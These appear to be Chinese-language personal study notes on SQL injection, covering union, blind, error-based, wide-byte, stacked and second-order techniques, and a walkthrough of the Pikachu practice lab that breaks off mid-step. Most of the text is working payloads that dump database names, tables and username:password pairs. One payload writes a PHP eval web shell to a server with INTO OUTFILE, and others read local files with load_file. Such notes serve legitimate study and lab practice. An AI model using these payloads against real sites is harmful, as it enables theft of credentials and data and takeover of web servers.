# SQL注入

## 注入过程

我们注入的过程就是**先拿到数据库名**，在获取到当前数据库名下的**数据表**，再获取当前**数据表下的列**，最后**获取数据**。

[参考资料](https://www.jianshu.com/p/078df7a35671)

[先知社区SQL手工注入](https://xz.aliyun.com/t/2869)

## SQL基本指令

### 查看数据库

```
show databases;
```

### 选择数据库

```
use 数据库名;
```

### 查看数据库下有哪些表

```
show tables;
```

### 查看表结构

```
desc 表名;
```

## 常用函数和表库名

- **数据库名：database()**
- **数据库版本： version()**
- **数据库用户： user()**
- 操作系统： @@version_compile_os
- 系统用户名： system_user()
- 当前用户名： current_user
- 连接数据库的用户名：session_user()
- 读取数据库路径：@@datadir
- MYSQL安装路径：@@basedir
- load_file 转成16进制或者10进制 MYSQL读取本地文件函数
- into outfile 写入函数
- **储存所有表名信息的表 : information_schema.tables**
- **表名 ： table_name**
- **数据库名： table_schema**
- **列名 ： column_name**
- **储存所有列名信息的表 ： information_schema.columns**

## SQL的运算优先级

当在同一表达式中出现多个运算符时，SQLServer根据运算符的优先级规则依次对它们进行计算。以下列表从高到低列出了各运算符的优先级：

1. （）(Parentheses)
2. *（Multiply），/（Division），％（MOdulO）
3. +（Positive），- （Negative），+（Add），（+Concatenate），- （Subtract）
4. =，>，<，>=，<=，<>，!=，!>，!<，（Comparison operators）
5. NOT
6. AND
7. BETWEEN，IN，LIKE，OR
8. =（Assignment）



## 注入注释

在最后记得写**--+**，或**--‘**——[关于sql注入为什么后面会跟上--+](https://www.cnblogs.com/laoxiajiadeyun/p/10274780.html)



## 普通注入



### 第一步 判断注入类型

判断是**数值查询**还是**SQL字符注入**

1. **SQL字符注入**

   ```mysql
   ?id=1' --+
   ```

   ```mysql
   ?id=1') --+
   ```

   ```mysql
   ?id=1 and 1=2 --+
   ```

   回显正常，则该地方是**SQL字符注入**，尝试在id后面加上'

   ```mysql
   ?id=1'
   ```

   回显不正常，表示可能存在SQL字符注入

   ```mysql
   ?id=1' --+
   ```

   输入--+将SQL后面的语句注视掉后，发现页面回显正常，则证明这个地方是**单引号字符型注入**

2. **数值型注入**

   ```mysql
   ?id=2-1
   ```

   回显正常，则该地方是**数值型注入**

3. **搜索型注入**

   1. 搜索keywords‘，如果出错的话，有90%的可能性存在漏洞；

   2. 搜索 keywords%，如果同样出错的话，就有95%的可能性存在漏洞；

   3. 搜索keywords% 'and 1=1 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=1）看返回的情况

   4. 搜索keywords% 'and 1=2 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=2）看返回的情况

   5. 根据两次的返回情况来判断是不是搜索型文本框注入了

      下面方法也可以测试：

      ```
      'and 1=1 and '%'='
      
      %' and 1=1--'
      
      %' and 1=1 and '%'='
      ```

      

例题：payload

```
?name= ' order by 3 --+
?name= ' union select 1,username,password from users --+


?name=%' order by 3 and'%'=' --+
?name= %') union select username,password from users --+
```

### 第1.5步：判断是否有小括号

**步骤1：**注入类型

`1`和`1"`正常回显，`1'`报错，判断为字符型，但是**还要判断是否有小括号**。

判断小括号有几种方法：

1. `2'&&'1'='1`

- 若查询语句为`where id='$id'`，查询时是`where id='2'&&'1'='1'`，结果是`where id='2'`，回显会是`id=2`。
- 若查询语句为`where id=('$id')`，查询时是`where id=('2'&&'1'='1')`，MySQL 将`'2'`作为了 Bool 值，结果是`where id=('1')`，回显会是`id=1`。

1. `1')||'1'=('1`
    若查询语句有小括号正确回显，若无小括号错误回显（无回显）。



### 第二步 判断有几列

使用 **order by** 语句判断，该表中一共有几列数据

```mysql
?id=1' order by 3 --+
```

输入数字，直到回显不正常，即该数据库有几列

### 第三步 查看页面是否有显示位，有几个

将id=1改为一个数据库不存在的id值，如861，

使用**union select 1,2,3**联合查询语句查看页面是否有显示位

```mysql
?id=861' union select 1,2,3 --+
```

**注意：**这个显示位指的是网页中能够显示数据的位置，

举例来说，比如我们通过ORDER BY命令**知道了表的列数为11**。然后再使用UNION SELECT 1,2,3…,11 from table，网页中**显示了信息8**，那么说明网页**只能够显示第8列中信息**，不能显示其他列的信息。也可以理解为**网页只开放了8这个窗口**，你想要查询数据库信息就必须要通过这个窗口。所以如果我们想要知道某个属性的值，比如admin,就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。

```mysql
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

### 第四步 爆值 Payload

#### 猜数据库（爆库）

```MySQL
select schema_name from information_schema.schemata --+

#查询数据库的所有字符串并以","分割每一条数据
select 1,2,group_concat(schema_name) from information_schema.schemata --+


id=0 union select 1,database() --+
```

#### 猜某库的数据表（爆表）

```MySQL
select table_name from information_schema.tables where table_schema="数据表名" --+


select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='表名') --+

//database()需要替换成暴库的库名
?name=0' union select 1,group_concat(table_name) from information_schema.tables where table_schema="database()" --+
```

#### 猜某表的所有列（爆列）

```MySQL
select column_name from information_schema.columns where table_name="表名称" --+


select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名称' --+

//举例表名称：httpinfo,member,message,users,xssblind
?name=0' union select 1,group_concat(column_name) from information_schema.columns where table_name='表名称常用users' --+
```

#### 获取某列的内容（爆字段）

```MySQL
select * from * --+

# 随机应变
select 1,2,group_concat(username,":",password) from 表名 --+
select 1,2,group_concat(username,0x3A,password) from 表名 --+

id,userid,ipaddress,useragent,httpaccept,remoteport,id,username,pw,sex,phonenum,address,email,id,content,time,id,username,password,level,id,time,content,nam

//举例列名称：id,username,password,level,id,username,password
?name=0' union select 1,group_concat(username,":",password) from users --+
```



## 盲注

### 第一步 判断注入类型

与普通注入不同，盲注需要利用**延迟**来判断是否注入成功——[盲注解体思想](https://zhuanlan.zhihu.com/p/25053315?utm_source=qq&utm_medium=social&utm_oi=992463846774296576)

#### limit

limit子句用于限制查询结果返回的数量，常用于分页查询

**格式：**

```mysql
select * from tableName limit i,n
#tableName：表名 
#i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
#n：为查询结果返回的数量
#i与n之间使用英文逗号","隔开

limit n 等同于 limit 0,n
```

**栗子：**

```mysql
#查询10条数据，索引从0到9，第1条记录到第10条记录
select * from t_user limit 10;
select * from t_user limit 0,10;

# 查询8条数据，索引从5到12，第6条记录到第13条记录
select * from t_user limit 5,8;
```





### **时间延迟型手工注入** sleep()

#### 爆库长payload

```mysql
?id=1' and if(length(database())=猜库长,sleep(5),1)--+
```

明显延迟，数据库长度为**输入值** 

#### 爆库名payload

```mysql
?id=1' and if(left(database(),1)='s',sleep(5),1)--+
```

明显延迟，数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)='security'

#### 爆表名payload

```mysql
?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+
```

通过坚持不懈的测试，终于在limit 3,1 爆破出user表名为users.

#### 爆列名payload

```mysql
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+
```

首先尝试定向爆破，以提高手工注入速度，修改limit x,1 中的x查询password是否存在表中，lucky的是limit 3,1的时候查到了password列，同样的方法查询username ，又一个lucky，接下来爆破字段的值。

#### 爆破值payload

```mysql
?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

```mysql
?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

按照id排序，这样便于对应。注意limit 从0开始.通过坚持不懈的尝试终于爆破到第一个用户的名字dumb，密码dumb，需要注意的是，MySQL对大小写不敏感，所以你不知道是Dumb 还是dumb。



### 布尔型手工注入

在布尔型注入中，**正确会回显，错误没有回显**，以此为依据逐字爆破，注意id=1

手工注入时可使用例如**left((select database()),1)<'t'** 这样的比较二分查找方法快速爆破

#### 暴库payload

```mysql
?id=1' and left((select database()),1)='s'--+
```

可以看>'t'无回显，而<'t'有回显。

最终确定的库名为security

#### 爆表payload

```mysql
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' --+
```

修改limit x,1和left中的位数限定数字，爆破到第一张表为referer，终于在第三张表爆破到user表，名为users

#### 爆列名payload

```mysql
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' --+
```

定向爆破制定password为字段名，最后找到第4个字段为password，同理看看有没有username，最后到找到了，接下来只需要爆破这两个字段的值就完事

#### 爆字段payload

```mysql
?id=1' and left((select password from users order by id limit 0,1),1)='d' --+
```

按照id排序，这样便于对应。注意limit 从0开始.最后爆破到第一个用户的名字dumb，密码dumb，需要注意的是，MySQL对大小写不敏感，所以你不知道是Dumb 还是dumb

布尔型的盲注比较烦的的就是手工注入很麻烦，必须慢慢试



#### 爆库payload

```mysql
?id=-1'union select count(*),count(*), concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
//或者
?id=-1'union select 1,count(*), concat('~',(select database(),'~'),floor(rand()*2)) as a from information_schema.tables group by a--+
//注意本本方法具有随机性，原理待研究
```

![img](https://img-blog.csdn.net/20180819134305207?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

#### 爆用户payload

```mysql
?id=-1' union select count(*),1, concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+
```

#### 爆表名payload

```mysql
?id=-1' union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```

修改limit x,1 可以遍历表名，找到user这个表，猜测它存放username和password

#### 爆列名payload

```mysql
?id=-1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tabvles group by a--+
```


修改limit x,1 可以遍历列名，找到username和password列

#### 爆字段payload

```mysql
?id=-1' union select count(*),1, concat('~',(select concat_ws('[',password,username) from users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```

![img](https://img-blog.csdn.net/20180819134726635?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

修改limit x,1 可以显示第x个用户的password和username  （‘[’是分隔符）

注入结束！





### **报错注入**

#### payload即我们要输入的SQL查询语句

[参考博客](https://blog.csdn.net/sdb5858874/article/details/80727555)

**三种报错注入常用的语句：**

- 通过floor报错

  > ```mysql
  > and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
  > ```
  >
  > 其中payload为你要插入的SQL语句
  > 需要注意的是该语句将 输出字符长度限制为64个字符

- 通过updatexml报错

  > ```mysql
  > and updatexml(1,payload,1) --+
  > ```
  >
  > 同样该语句对输出的字符长度也做了限制，其最长输出32位
  >
  > 并且该语句对payload的反悔类型也做了限制，只有在payload返回的**不是xml格式才会生效**

- **通过ExtractValue报错**

  > ```mysql
  > and extractvalue(1, payload) --+
  > 
  > ' or extractvalue(1,concat('~',(select username,password from users),"~") or '
  > ```
  >
  > 输出字符有长度限制，最长32位


#### updatexml()函数

```
updatexml (XML_document, XPath_string, new_value); 

updatexml ("~",concat(), new_value); 
xxx' or updatexml(1,concat(0x7e,database()),0) or '
```

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据 
作用：改变文档中符合条件的节点的值

**解释：**

由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。[参考](https://blog.csdn.net/qq_37873738/article/details/88042610)



#### concat聚合函数

参考资料：http://www.2cto.com/article/201303/192718.html

[参考资料——less5](https://blog.csdn.net/qq_41420747/article/details/81836327)

简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。

比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。

例如select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;
查询数据库版本，我在phpmyadmin中测试：

<img src="https://img-blog.csdn.net/20180820190308968?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:200%;" />

可以看到测试的错误信息中出现了版本号。即构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。废话不多说，想了解更详细的看链接的内容，下面进入正题。

payload在concat()中构造



#### 总结

利用**updatexml()**函数来进行报错注入点的**创造**，用**concat()**聚合函数来配合**updatexml()**函数来构造**非xml格式的语法**的**“故意出错”**，令**updatexml()**函数返回报错信息，我们就是利用这个报错的信息进行注入，返回**报错信息（我们需要的数据）**



#### less 5 报错注入解法

##### 方法一

[参考](https://blog.csdn.net/qq_41420747/article/details/81836327)

##### 方法二

**爆库名**

```mysql
?id=1' and updatexml(1,concat('~',(select database() limit 0,1),'~'),3)--+
```

**爆表名**

```mysql
?id=1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 1,1),'~'),3)--+
```

**爆列名**

```mysql
?id=1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name='users' limit 4,1),'~'),3)--+
```

**爆数据**

```mysql
?id=1' and updatexml(1,concat('~',(select password from users order by id limit 1,1),'~'),3)--+
```



### 其他手工注入

```mysql
and (select * from (select concat_ws("^",查询语句,floor(rand(0)*2))x,count(*) from information_schema.tables group by x)y) %23
```

**代码说明：**

> **floor()**是取整数
> **rand()**在0和1之间产生一个随机数
> **rand(0)*2**将取0到2的随机数，并不是执行两次随机数
> **floor(rand()*2)**有两条记录就会报错
> **floor(rand(0)*2)**记录需为3条以上，且3条以上必报错，返回的值是有规律的
> **count(*)**是用来统计结果的，相当于刷新一次结果
> **group by**对数据分组。时会先看看虚拟表里有没有这个值,若没有就插入,若存在则**count(*)**加1
> **group by时floor(rand(0)*2)**会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
> ()后面的x或者y都是对表做的别名，将as省略了
> and后面超长的()不能去掉！！！

[floor()函数报错分析](https://blog.csdn.net/cried_cat/article/details/80022378)

#### 获取库名

```mysql
payload = database()

union and (select * from (select concat_ws("^",database(),floor(rand(0)*2))x,count(*) from information_schema.tables group by x)y) --+
```

#### 获取表名

替换limit参数即可

```mysql
payload = (select table_name from information_schema.tables where table_schema='security' limit 0,1)

union and (select * from (select concat_ws("^",(select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x,count(*) from information_schema.tables group by x)y) --+ 
```

#### 获取字段名

替换limit参数即可

```mysql
payload = (select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1)

union and (select * from (select concat_ws("^",(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor(rand(0)*2))x,count(*) from information_schema.tables group by x)y) --+ 
```

#### 爆字段

替换limit参数即可

```mysql
payload = (select concat_ws("^",id,username,password) from users limit 0,1)

union and (select * from (select concat_ws("^",(select concat_ws("^",id,username,password) from users limit 0,1),floor(rand(0)*2))x,count(*) from information_schema.tables group by x)y) --+ 
```





(XPath)    updatexml(xml_doc,string,new value)



## 盲注用到的函数

sleep()、length() 、 substr() 、mid() 、left() 、ord()、ascii() 、right() 、if()、 reverse()

sleep()：MySQL中执行select sleep(N)可以让此语句运行N秒钟

length()： 返回字符串的长度

substr()：返回一个字符串的一部分

mid()：返回一个字符串的一部分

left()：返回字符串左面的几个字符

right()：返回字符串右面的几个字符

ord()：返回字符串第一个字符的**ASCII**值

ascii()：字符串的**ASCII**代码值

if()：\> select if (1>2,2,3);  ->3

reverse()：返回字符串str并反转字符串的顺序



# SQL注入练习

## MySQL 5.0及以上默认库

information_schema

- schemata						所有数据库的名字
  - schema_name		数据库名
- tables                              所有表的名字
  - table_schema		 表所属数据库的名字
  - table_name             表的名字
- columns                          所有字段的名字
  - table_schema		 字段所属数据库的名字
  - table_name             字段所属表的名字
  - column_name         字段的名字



## Payload构造

### union联合注入

1. **爆库**

   ```
   ?xxxx=0' union select 1,database() --+		//判断闭合类型
   
   ?xxxx=0' union select 1,group_concat(schema_name)from(information_schema.schemata) --+
   ```

2. **爆表（database()可以替换成，爆库查到的库名）**

   ```
   ?xxxx=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="database()" --+
   
   ?username=1' union select 1,2,group_concat(table_name) from information_schema.columns where table_schema = 'geek'%23
   ```

3. **爆列名**

   ```
   //举例表名：httpinfo,member,message,users,xssblind
   
   ?xxxx=0' union select 1,group_concat(column_name) from information_schema.columns where table_name="表名常用users" --+
   
   ?xxxx= %') union select 1,group_concat(column_name) from information_schema.columns where table_name="表名常用users" --+
   ```

4. **爆值**

   ```
   //举例列名称：id,username,password,level,id,username,password
   
   ?name=0' union select 1,group_concat(username,":",password) from users --+
   
   ?name= %') union select username,password from users --+
   ```




### 报错注入

可以随意跟换函数，需要注意参数个数

- **or updatexml()**
  
  - **3个参数**，最多输出32个字符，`and updatexml(1,payload,1) --+`
  
- **or extractvalue()**
  
  - **2个参数**，最多输出32个字符，`and extractvalue(1, payload) --+`
  
- **floor (rand(0)*2)**

  - 最多输出64个字符

  - ```
    ?id=-1'union select count(*),1, concat('~',(payload),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
    //在payload中插入语句
    ```

post传参，合理构造payload

- 判断

  ```
  ?id=1' and 1=1 --+		//正确
  ?id=1' and 1=2 --+		//失败
  ```

1. 爆库

   ```
   id=0' or updatexml(1, concat('~',database()), 1) --+
   ```

2. 爆表

   ```
   //updatexml、ExtractValue型（只需替换参数个数）
   ?id=0' or updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) --+
   
   //follr型
   ?id=-1'union select count(*),1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
   
   ?id=0'||updatexml(1,concat('~',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),0)||'1'='1
   ```

3. 爆列

   ```
   ?id=0' or updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users替换表名'),'~'), 1) --+
   
   ?id=0'||updatexml(1,concat('~',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security')&&(table_name='users'))),0)||'1'='1		//&&=%26%26
   ```

   

4. 爆值

   ```
   ?id=0' or updatexml(1, concat('~',(select group_concat(username,':',password) from users替换表名),'~'), 1) --+
   
   //有的时候，显示不全用not in，或用right()语句查询后面的部分
   ?id=0' or updatexml(1, concat('~',(select group_concat(username,':',password) from users替换表名 where username列名 not in ('上面查过的值','同左','同左')),'~'), 1) or --+
   ```

   

### insert/update注入

- **updatexml()**
  - **3个参数**，`and updatexml(1,payload,1) --+`
- **extractvalue()**
  - **2个参数**，`and extractvalue(1, payload) --+`

后台MySQL语句可能为：

```
insert into user (name) value ('PDD');
```

1. 爆库

   ```
   ?id=1' or updatexml(1, concat('~',database()), 0) or '
   ```

2. 爆表

   ```
   ?id=1' or updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) or '
   
   'or updatexml(1, right(concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),25), 0) or '
   //right解决显示不全
   ```

3. 爆列名

   ```
   ?id=1' or updatexml(1, right(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users替换表名'),'~'),25), 1) or '
   
   ?id=1' or updatexml(1, right(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),25), 0) or '
   ```
   
4. 爆值

   ```
   ?id=1' or updatexml(1, concat('~',(select group_concat(username,':',password) from users替换表名),'~'), 1) or '
   //有的时候，显示不全用not in，或用right()语句查询后面的部分
   
   ?id=1' or updatexml(1, concat('~',(select group_concat(username,':',password) from users替换表名 where username列名 not in ('上面查过的值','同左','同左')),'~'), 1) or '
   ```



### 宽字节注入

在GBK编码中，mysql会认为两个字符是一个汉字（在前一个ASCII码大于128的情况下）

使用条件：

1. 使用addslashes函数（并且开启GPC）
2. 数据库编码设置为GBK（php编码为 utf-8 或其他非GBK格式）
3. `%df'` 或者 `%df%27` 

爆库

```
%df%5c' union select 1,database()--+	
```

爆表

```
1%df%5c' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

爆字段

```
1%df%5c%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273(这里为users的16进制表示)--+
```

爆值

```
1%df%5c%27 union select 1,group_concat(username,0x3b,password) from users--+
```



### 堆叠注入

SQL中，用分号（;）来连接多条语句并一起执行。

执行条件十分有限，可能受到API或者数据库引擎等的限制

1. 查数显

   ```
   ?id=1' order by 2--+
   ```

2. 查看注入注入是否成功

   ```
   ?id=1';show databases%23
   ```

3. 爆表

   ```
   ?id=1'; show tables%23
   ```

4. 查字段

   ```
   ?id=1'; show columns from `1919810931114514` %23
   ```

5. 爆值

   ```
   ?id=1'; handler `1919810931114514` open;handler`1919810931114514` read first;		//handler查看内容
   ```



### SQL注入文件的写入和读取

使用之前我们需要找到网站的绝对路径。（获取办法：报错信息、谷歌语法、site：目标网站 warning、遗留文件如phpinfo、读取配置文件路径）

注意路径符号："\\\\"、"/"都是正确的，"/"错误，如果路劲转换为16进制就可以不用引导

- 文件写入**into outfile函数**

  ```
  ?id=1' union select 1,"<?php @eval($_GET['x']); ?>",3,4 into outfile 'C:/wwwroot/webshell.php --+
  ```

- 文件读取**load_file()函数**，只能读取到内容，读不到源码

  ```
  ?id=1' union select 1,load_file("C:/wwwroot/webshell.php"),3,4 --+
  ```



### 二次注入

#### 步骤

1. 插入恶意代码（转以后将原始数据存取数据库且提取时不做过滤）
2. 找到需要使用我们插入恶意代码的功能的地方（修改密码、留言板）
3. 正常使用此功能使其触发SQL注入

#### 举例

注册用户名为：`admin'#`，再进行修改密码操作时进行SQL注入

```
UPDATE users SET password='123' where username='admin'#' and password='$password';
```




## Pikachu-SQL靶场

### 数字型注入（POST）

#### 考点：post传参，理解如何注入

#### 思路：

bp抓包，发现是post传参方式，于是拿bp抓包

判断什么类型传参

id=1' --+		//报错，应该不是字符串型
?id=2-1 --+		//正常显示，判断为数学型注入


1. 爆库

   ```
   ?id=0 union select 1,database() --+
   库名：pikachu
   ```


2. 爆表

   ```
   ?id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema="pikachu" --+
   表名：httpinfo,member,message,users,xssblind
   ```


3. 爆列名

   ```
   ?id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name="users" --+
   
   列名：id,username,password,level,id,username,password
   ```


4. 爆值

   ```
   ?id=0 union select 1,group_concat(username,":",password) from users --+
   
   值：admin:e10adc3949ba59abbe56e057f20f883e
   ```




### 字符型注入（GET）

#### 考点：get传参，数显位数

#### 思路：

bp抓包，发现是get传参方式，拿HackBar注入

判断什么类型传参

?name=1'	//报错，信息为：''1''' ，观察发现单引号闭合的“字符串”类型

1. 爆库

   ```
   ?name=0' union select 1,database() --+
   库名：pikachu
   ```


2. 爆表

   ```
   ?name=0' union select 1,group_concat(table_name) from information_schema.tables where table_schema="pikachu" --+
   ```


3. 爆列名

   ```
   ?name=0' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" --+
   ```


4. 爆值

   ```
   ?name=0' union select 1,group_concat(username,":",password) from users --+
   ```




### 搜索型注入

#### 考点：SQL语句中利用like来进行模糊判断

就可以猜测模糊查询的字段应该是**'%查询内容%'**，那么我可以构造**xxx%' or 1=1#**

#### 思路：

get传参，构造**?name=1')**，发现报错，接着**判断数显位数**

```
')%''		//证实为like，并且闭合为)%',

?name=0' order by 3		//当输入4时报错，因此有3位数显
```



1. 爆库

   ```
   ?name=0' union select 1,2,database() --+
   ```


2. 爆表

   ```
   ?name=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="pikachu" --+
   ```


3. 爆列名

   ```
   ?name=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+
   ```


4. 爆值

   ```
   ?name=0' union select 1,username,password from users --+
   ```




### xx型注入

#### 考点：判断闭合方式

#### 思路：

get传参，构造**?name=1')**，发现回显正常，接着**判断数显位数**

```
?name=1')
?name=1') union select 1,2--+	//当为两位时，正常显示
```



1. 爆库

   ```
   ?name=0') union select 1,database() --+
   ```


2. 爆表

   ```
   ?name=0') union select 1,group_concat(table_name) from information_schema.tables where table_schema="pikachu" --+
   ```


3. 爆列名

   ```
   ?name=0') union select 1,group_concat(column_name) from information_schema.columns where table_name="users" --+
   ```


4. 爆值

   ```
   ?name=0') union select username,password from users --+
   ```




### "insert/update"报错注入

#### 考点：updatexml() & extractvalue() 报错注入

updatexml() & extractvalue()本质上的注入方法就是通过报错的返回来进行传参，两个函数有略微差异，但差别不大

#### 思路：

准备：

- **不能使用联合查询**

- **updatexml()**
  - **3个参数**，`and updatexml(1,payload,1) --+`
- **extractvalue()**
  - **2个参数**，`and extractvalue(1, payload) --+`

post传参，合理构造payload



#### 1、注册，insert语句中进行注入

注册一个账号时，就是在数据库中添加了数据，那么我们可以在注册页面插入我们的注入语句

猜测后台MySQL语句为：

```
insert into user(name,password,sex,phone,address1,address2) value('xxx',123,1,2,3,4)
```


因此可以构造语句类似于：

```
xxx' or updatexml(1,concat(0x7e,database()),0) or '
//其中0x7e为"~"
```



1. 爆库

   ```
   'or updatexml(1, concat(0x7e,database()), 0) or '
   //注册信息中，用户、密码文本框填入
   ```

2. 爆表

   ```
   'or updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) or '
   //注册信息中，用户、密码文本框填入，但是显示不全
   
   'or updatexml(1, right(concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),25), 0) or '
   //注册信息中，用户、密码文本框填入，right解决显示不全
   ```


3. 爆列名

   ```
   'or updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'), 0) or '
   
   'or updatexml(1, right(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),25), 0) or '
   //注册信息中，用户、密码文本框填入
   ```


4. 爆值

   ```
   'or updatexml(1, concat(0x7e,(select group_concat(username,':',password) from users),'~'), 0) or '
   //只能看到一个数据，需要使用：where not in 
   ```




#### 2、修改信息，update语句中进行注入

当更新我们的信息，需要用到的时候update语句。

猜测后台语句：

```mysql
update tables set sex = '$sex' where name = 'sbb';
```

因此可以构造语句：

```mysql
xxx' or updatexml(1,concat(0x7e,database()),0) or '
```



1. 爆库

   ```
   'or extractvalue(1, concat(0x7e,database())) or '
   //修改信息中，随便一个文本框填入
   ```

2. 爆表

   ```
   'or extractvalue(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~')) or '
   //修改信息中，随便一个文本框填入
   
   'or extractvalue(1, right(concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),25)) or '
   //修改信息中，随便一个文本框填入
   ```

3. 爆列名

   ```
   'or extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),'~')) or '
   //修改信息中，随便一个文本框填入
   
   'or extractvalue(1, right(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),25)) or '
   //修改信息中，随便一个文本框填入
   ```

4. 爆值

   ```
   'or extractvalue(1, concat(0x7e,(select group_concat(username,':',password) from users),'~')) or '
   //修改信息中，随便一个文本框填入
   
   sex=1' and updatexml(1, concat(0x7e,(select (concat_ws('-',username,password)) from pikachu.users limit 0,1)),1)%23
   //也可以试试这个用concat_ws()函数
   ```



### "delete"注入

在删除的时候，数据库需要调用delete，此时依旧**需要使用报错注入**

#### 考点：报错注入

#### 思路

需要抓取删除操作的数据包

类似于上一题就不重复了

**payload**

```
?id=78 or extractvalue(1, concat('~',(select group_concat(username,':',password) from users),'~'))
```



### "http header"注入

#### 考点：http请求头注入

有些时候，后台开发人员为了验证客户端头信息，比如常用的cookie验证，或者通过http请求头信息获取客户端的一些信息，比如useragent、accept字段等等，会对客户端的http请求头信息获取并使用sql进行处理，如果此时没有足够的安全考虑，则可能会导致基于http头的sql注入漏洞

#### 思路

bp抓包，**选择user-agent进行传参**，因为发现user-agent标识出了我们，**单引号发现有报错信息**，直接使用我们准备好的payload

**payload**

```
1'or updatexml(1, concat(0x7e,(select group_concat(username,':',password) from users),'~'), 0) or '
```



### 盲注(base on boolian)

这道题，需要用or来进行连接

- and必须输入为真，并且会返回真的数据。

- or前为假，返回后面注入的查询语句

#### 考点：正确判断盲注闭合，学会构造payload，利用多种盲注函数

#### 准备

熟悉常见盲注函数，sleep()、length() 、substr() 、mid() 、left() 、ord()、ascii() 、right() 、if()、 reverse()

- **substr()：** **三个参数**，截断，返回一个字符串的一部分
  - 参数1：需要返回的字符串（就是注入payload）
  - 参数2：从哪里开始截断，可为负值，但一般为1
  - 参数3：需要截断的字符数量
- **ascii()：**将字符转换为ASCII，通常将substr()包裹在内进行判断
- **length()：**判断字符长度
- **sleep()：**延迟，让此语句运行N秒钟，**常与if连用**进行判断是否判断正确
- **if()：** **三个参数**，进行判断

#### 思路

**猜库**

```
?name=kobe' and ascii(substr(database(),1,1))=112--+
//判断得到库名是pikachu
```

**猜表**

```
?name=kobe' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120--+
//通过ASCII码大小判断得到表名


